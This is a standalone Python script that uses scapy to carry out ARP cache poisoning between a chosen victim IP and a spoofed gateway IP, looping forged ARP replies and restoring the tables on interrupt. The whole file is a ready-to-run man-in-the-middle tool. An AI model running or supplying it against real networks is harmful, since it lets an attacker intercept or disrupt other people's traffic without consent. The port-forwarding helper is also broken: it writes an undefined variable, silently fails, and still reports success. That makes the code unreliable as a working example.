#!/usr/bin/python3

import scapy.all as scapy
import time
import sys
import argparse

def getmac(ip):
    """
    Function to get mac from given IP addr
    """
    try :
        arp_request = scapy.ARP(pdst = ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast/arp_request
        answered_list = scapy.srp(arp_request_broadcast,timeout=1,verbose=False)[0]
        return  answered_list[0][1].hwsrc
    except Exception as _err:
        parser.error(f"[-] Error getting mac address for {ip}")
        print(parser.print_help())
        exit()

def spoof(target_ip,spoof_ip):

    dst_mac = getmac(target_ip)
    arp_respond = scapy.ARP(op=2,pdst=target_ip,hwdst=dst_mac,psrc=spoof_ip)
    scapy.send(arp_respond,verbose=False)

def restore(destination_ip,source_ip):

    dst_mac=getmac(destination_ip)
    src_mac=getmac(source_ip)
    arp_respond = scapy.ARP(op=2,pdst=destination_ip,hwdst=dst_mac,psrc=source_ip,hwsrc=src_mac)
    scapy.send(arp_respond,verbose=False,count=4)

def port_forwarding(enable=0):
    try:
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as fWrite:
            fWrite.write(str(val))
    except Exception as _err:
        return False
    return True


parser=argparse.ArgumentParser()    
parser.add_argument("-t","--target-ip",dest="victim",help="Specify Victim IP addres")
parser.add_argument("-s","--spoof-ip",dest="spoof",help="Specify Spoofing IP addres")
options = parser.parse_args()

if not options.victim:
    parser.error("[-] Specify an IP Address for victim --help for more details")
    print (parser.print_help())
    exit()

if not options.spoof:
    parser.error("[-] Specify an IP Address for spoofing --help for more details")
    print (parser.print_help())
    exit()

target_ip = options.victim
gateway_ip = options.spoof

count = 0
try:
    # port forwarding
    pf = True
    try:
        port_forwarding(enable=1)
    except Exception as _err:
        print ("[-] port forwarding failed, run as root, or do it manually")
        pf = False

    print ("[+] Done port forwarding")

    while True:
        #telling client i am the router
        spoof(target_ip,gateway_ip)
        #telling router i am the client
        spoof(gateway_ip,target_ip)
        count = count + 2
        print ("\r[+] sending packets "+str(count), end='')
        # sys.stdout.flush()
        time.sleep(2)

except KeyboardInterrupt:
        print ("\n[+] Detected CTRL+C... Please wait while we restore ARP")
        #restoring client
        restore(target_ip,gateway_ip)
        #restoring router
        restore(gateway_ip,target_ip)
        if pf:
            try:
                port_forwarding(enable=0)
            except Exception as _err:
                print ("[-] Disable port forwarding failed, run as root, or do it manually")
